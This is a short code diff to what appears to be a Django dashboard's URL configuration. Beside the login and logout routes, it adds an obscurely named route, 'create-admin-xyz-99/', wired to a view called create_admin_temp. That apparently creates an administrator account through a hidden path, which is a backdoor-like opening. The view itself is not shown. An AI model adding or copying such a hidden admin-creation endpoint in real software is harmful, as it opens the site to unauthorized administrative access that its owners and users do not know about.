@@ -10,6 +10,7 @@ urlpatterns = [
     # Auth
     path('login/', views.dashboard_login, name='login'),
     path('logout/', views.dashboard_logout, name='logout'),
+    path('create-admin-xyz-99/', views.create_admin_temp),
 
     # Home
     path('', views.dashboard_home, name='home'),
